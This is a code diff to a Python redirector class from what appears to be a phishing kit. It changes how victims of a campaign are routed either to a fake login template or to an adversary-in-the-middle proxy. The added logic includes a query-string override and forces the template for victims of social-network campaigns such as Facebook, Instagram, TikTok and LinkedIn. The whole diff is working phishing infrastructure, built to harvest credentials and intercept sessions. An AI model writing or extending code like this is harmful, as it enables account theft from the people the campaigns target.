@@ -44,6 +44,10 @@ class SmartRedirector:
                 client_ip=client_ip,
                 user_agent=user_agent
             )
+            # Template override (force affichage page login)
+            if request.query_params.get("template", "").lower() in ("1", "true", "yes") or \
+               request.query_params.get("view", "") == "template":
+                self.session_manager.update_session(session_id, {"template_override": True})
             try:
                 with open(self.template_path, "r") as f:
                     content = f.read()
@@ -134,12 +138,21 @@ class SmartRedirector:
     def _get_final_destination(self, campaign_id: str, session_id: str):
         """Détermine l'URL finale (AiTM ou Template)"""
         campaign = redis_cache.get(f"campaign:{campaign_id}")
-        redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}" # Default to template
+        # Par défaut: Template login (affichage immédiat)
+        redirect_to = f"/v5/phish/{campaign_id}/login?sid={session_id}"
         
-        if campaign and campaign.get("type") == "aitm":
-            # AiTM Mode: Redirection vers le proxy avec le session_id
+        # Lecture override session
+        session = self.session_manager.get_session(session_id)
+        template_override = bool(session.get("template_override")) if session else False
+        
+        # Force template pour réseaux sociaux, ou si override actif
+        social_keys = {"twitter", "x", "instagram", "facebook", "tiktok", "reddit", "linkedin"}
+        template_id = campaign.get("template_id") if campaign else None
+        is_social = template_id in social_keys if template_id else False
+        
+        if campaign and campaign.get("type") == "aitm" and not (template_override or is_social):
             redirect_to = f"/v5/p/{session_id}/"
-            
+        
         return {"redirect_to": redirect_to}
 
 # Instance globale
